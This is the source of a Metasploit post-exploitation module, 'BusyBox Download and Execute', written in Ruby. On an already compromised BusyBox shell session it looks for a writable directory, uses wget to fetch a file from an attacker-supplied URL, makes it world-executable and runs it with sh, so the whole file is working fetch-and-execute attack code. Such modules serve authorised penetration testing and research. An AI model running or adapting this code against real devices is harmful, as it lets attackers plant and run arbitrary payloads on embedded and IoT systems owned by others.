##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::BusyBox

  def initialize
    super(
      'Name'         => 'BusyBox Download and Execute',
      'Description'  => %q{
        This module will be applied on a session connected to a BusyBox shell. It will use wget to
        download and execute a file from the device running BusyBox.
      },
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell']
    )

    register_options(
      [
        OptString.new('URL', [true, 'Full URL of file to download'])
      ])
  end

  def run
    print_status('Searching a writable directory...')
    writable_directory = busy_box_writable_dir
    if writable_directory
      print_status('Writable directory found, downloading file...')
      random_file_path = "#{writable_directory}#{Rex::Text.rand_text_alpha(16)}"
      cmd_exec("wget -O #{random_file_path} #{datastore['URL']}")
      Rex::sleep(0.1)

      if busy_box_file_exist?(random_file_path)
        print_good('File downloaded, executing...')
        cmd_exec("chmod 777 #{random_file_path}")
        Rex::sleep(0.1)
        res = cmd_exec("sh #{random_file_path}")
        vprint_status(res)
      else
        print_error('Unable to download file')
      end
    else
      print_error('Writable directory not found')
    end
  end
end
